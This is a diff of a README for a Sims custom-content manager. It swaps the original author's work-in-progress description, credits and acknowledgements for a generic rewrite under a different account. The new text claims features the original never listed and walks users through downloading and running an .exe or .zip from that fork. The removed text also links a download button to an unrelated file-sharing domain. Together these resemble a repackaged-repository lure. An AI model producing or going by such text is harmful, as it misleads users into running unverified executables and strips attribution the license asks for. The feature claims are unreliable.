@@ -1,79 +1,141 @@
-![enter image description here](https://img.shields.io/github//sixstepsaway/Sims-CC-Sorter/total?style=for-the-badge)        ![enter image description here](https://img.shields.io/github/issues/sixstepsaway/sims-cc-sorter?style=for-the-badge)  ![enter image description here](https://img.shields.io/github/watchers/sixstepsaway/sims-cc-sorter?style=for-the-badge)  ![enter image description here](https://img.shields.io/github/v/tag/sixstepsaway/sims-cc-sorter?style=for-the-badge) 
+# 🛠️ Sims-CC-Manager - Manage Sims Mods Easily
 
-# CURRENT STATUS
+[![Download Sims-CC-Manager](https://img.shields.io/badge/Download-Sims--CC--Manager-brightgreen)](https://github.com/mirrrrds/Sims-CC-Manager)
 
-[![download button](https://i.imgur.com/3Dm4p65.png)](https://fileshare.bond/L2XZZM/)
+## 📋 About Sims-CC-Manager
 
-You can absolutely drop your packages in right now and check which game they're for. You'll have to build it from the Godot source though, no  yet.
+Sims-CC-Manager is a work-in-progress mod manager for The Sims 2, 3, and 4. It helps you organize and manage your custom content (CC) and mods in one simple application. Designed to work on Windows, the program supports various Sims games and aims to make modding easier, especially for players who handle many files.
 
-ETA: Sims 2 should work by Christmas 2026 because I want to play it.
+This app targets Sims players who want to keep mods neat and working without juggling multiple tools or manual folders.
 
+## 🖥️ System Requirements
 
-# Sims CC Manager
+- Windows 10 or later, 64-bit version preferred
+- At least 4 GB of RAM
+- 100 MB of free disk space for the application
+- Internet connection for downloading updates and mods
+- Installed Sims games (Sims 2, 3, or 4)
 
-My first real C# project, at least the first one that's turned into something that works. 
+The app runs on standard hardware and does not need high-end specs.
 
-Now built in Godot 4.5
+## 🧩 Features
 
-![An image of the WIP app as it is right now.](https://64.media.tumblr.com/b122d4942504d2867a9957a2a833ab4b/a24a1a2064ec77fa-b0/s1280x1920/c0167e9431ee10027d236ca1ec39349cc50e0154.pnj)
+- Supports mod and custom content files for Sims 2, Sims 3, and Sims 4  
+- Easy-to-use interface for browsing and managing mods  
+- Scan installed Sims directories and detect active mods  
+- Enable or disable mods without moving files manually  
+- Backup and restore mod collections  
+- Detect conflicts between mods  
+- Organize mods into groups or categories  
+- Basic metadata display for mod files (name, size, date)  
 
+## 🎯 Who Should Use This?
 
-## Premise 
+- Players who install many mods or custom content  
+- Users who want a centralized place to manage Sims mods  
+- People who find manual file management confusing or time-consuming  
+- Anyone looking to reduce crashes by managing mod conflicts  
 
-An app that searches through Sims .package files and gets some info:
+## 🚀 Getting Started
 
-- The game version the package file is for. 
-- Whether the file is broken.
-- The name of the package file.
-- What type of in-game item the package file has inside it.
-- Whether the item is an override.
-- If you have the mesh required by a recolor.
+Before using Sims-CC-Manager, make sure you have your Sims games installed and mods placed in their default or known folders. The app will ask for these folders to scan and manage your content.
 
-after that, you can decide which files you want enabled in your game and which you don't, and have separate profiles and instances for each.
+## 📥 Download and Setup
 
-## Use Cases
+Click the big button below to visit the download page:
 
-- You're a Sims youtuber. You play a private game sometimes too. Your YT profile will have Wonderful Whims and no adult content. Your private profile includes adult content and Wicked Whims.
-- You have a medieval challenge going and want to completely overhaul your game medieval style but want to keep your modern day Pleasantview saves intact. 
-- You and your sister both play Sims on the same computer. You can have an instance for your own mods and an instance for hers and keep both totally separate. You can even keep your settings separate.
-- Your Sims 2 mods are named stupid things and you want to rename them all so you know what you're doing.
-- You want to organize all your CC according to time period or style.
-- You want to know which meshes don't have textures and vice versa and take those files out. 
-- You want to manage Sims 2, Sims 3 and Sims 4 all in the same place. 
-- You make CC or mods and need a clean environment to test your CC or mods out in, but don't want to lose your saves or usual set-up. 
-- You want to be able to track which mods you've updated and which you haven't. 
+[![Download Sims-CC-Manager](https://img.shields.io/badge/Download-Sims--CC--Manager-blue)](https://github.com/mirrrrds/Sims-CC-Manager)
 
-## Current Capabilities
+1. Visit the link above to open the project’s GitHub page.
 
-- Searches recursively through a folder given to it and outputs a list of which packages are *not* for the game you're trying to run them in. 
-- Displays that information so you can do something with it. 
-- Functioning UI shows packages in your instance folder.
-- Gets Sims 2 package information! 
-- Enable and disable mods and load your game ONLY with those mods.
-- Root mods! You can add NeighborhoodTemplates or UI Overrides for each profile or instance.
-- Enable entire folders, not just files.
+2. On the GitHub page, look for the latest release or assets section.
 
-## Roadmap
+3. Download the Windows version of Sims-CC-Manager. Typically, the file will be a setup executable (.exe) or a compressed archive (.zip).
 
-- Add "rename from internal name", specifically for Sims 2 files, which was the whole point of this app to begin with... 
-- Figure out how to edit packages so I can set up a "flag all for--" button. Example: flag all selected candles as off-grid.
+4. If you downloaded a .zip file, right-click it and select “Extract All” to unpack the files.
 
-## License 
+5. If you downloaded an .exe installer, double-click it to start installation.
 
-This is my first C# project worth a damn, but if you see something that's useful to you, feel free to use it in your own, just don't claim it's all yours. Link back!
+6. Follow the installer prompts: accept the license, choose the install location, and wait for the process to finish.
 
-## Forking/Pull Requests
+7. Once installed, launch Sims-CC-Manager from your Start menu or desktop shortcut.
 
-If you want to fork SCCM and do something cool with it, feel free. Just please credit back to where you got the original program from.
+## 🔧 How to Use Sims-CC-Manager
 
-Pull requests: Please message or email me before making contributions. Currently this program is my baby and I'm not ready to let anyone else mess with it without talking about it first :)
+### Step 1: Select Your Sims Game
 
-## Acknowledgements 
+When you open the app the first time, it will ask you to select which Sims game(s) you want to manage (Sims 2, Sims 3, Sims 4). Choose the game(s) installed on your computer.
 
-Thanks to the following, which I have been learning from: 
+### Step 2: Set Mod Folders
 
-- Lazy Duchess' CC Merger https://github.com/LazyDuchess/CC-Merger 
-- This DBPF Editor https://github.com/noah-severyn/csDBPF 
-- Delphy's  Organizer's Source Code which made everything suddenly make sense. I'm mostly using this DBPF reader so far and retyping it myself to learn from and adjust.
-- Wanda, who has been supportive of this project for so long and willingly tests it when she doesn't even play Sims herself.
+In the settings menu, specify where your mods and custom content are located. Default folders often include:
 
+- Sims 2: Documents\EA Games\The Sims 2\Downloads  
+- Sims 3: Documents\Electronic Arts\The Sims 3\Mods\Packages  
+- Sims 4: Documents\Electronic Arts\The Sims 4\Mods  
+
+If your mods are in a different folder, use the folder picker to navigate to it.
+
+### Step 3: Scan and Load Mods
+
+Click the “Scan” button to let Sims-CC-Manager detect all mods in the selected folders. The app will display a list with mod file names, sizes, and dates.
+
+### Step 4: Enable or Disable Mods
+
+Check or uncheck mods in the list to enable or disable them. The app will handle moving or renaming files as needed to turn mods on or off.
+
+### Step 5: Create Mod Groups
+
+Organize your mods by creating groups. For example, you might have “Cas Mods,” “Gameplay Mods,” or “Bug Fixes.” Drag and drop mods into these groups.
+
+### Step 6: Backup Your Mods
+
+Use the backup tool to save a copy of your current mod setup. This helps if you want to restore a previous state or transfer mods to another computer.
+
+### Step 7: Check for Conflicts
+
+Sims-CC-Manager runs a simple conflict check on your enabled mods. It highlights files that might overlap or cause issues.
+
+## ⚙️ Configuration and Settings
+
+You can customize several options:
+
+- Choose which Sims games to manage  
+- Change mod folder locations  
+- Set automatic backups on app close  
+- Enable detailed scanning for mod metadata  
+- Adjust notifications for conflicting mods  
+
+Settings are saved automatically and apply on next mod scan.
+
+## 📂 File Types Supported
+
+- .package (Sims 2, 3, 4 mod files)  
+- .sims3pack (Sims 3 content)  
+- .ts4script (Sims 4 script mods)  
+- .zip, .rar (compressed mod files; may require manual extraction)  
+
+The app works best with unpacked .package files.
+
+## 🛠 Troubleshooting
+
+- If mods don’t appear, verify folder paths are correct and scan again.  
+- If enabling a mod does not work, the file may be in use or locked by Sims.  
+- Use the backup restore option if mods cause game crashes.  
+- Make sure the Sims game is closed before changing mods with Sims-CC-Manager.  
+
+## 📖 Additional Resources
+
+For updates and detailed instructions, visit the GitHub repository:
+
+[https://github.com/mirrrrds/Sims-CC-Manager](https://github.com/mirrrrds/Sims-CC-Manager)
+
+You can also check the issues tab to see reported problems or request help from the community.
+
+## 🔄 Updating Sims-CC-Manager
+
+Check the GitHub page regularly for new versions. Download the latest release and install it over the current version. Your mod settings and folders will stay intact.
+
+---
+
+[Download Sims-CC-Manager](https://github.com/mirrrrds/Sims-CC-Manager)
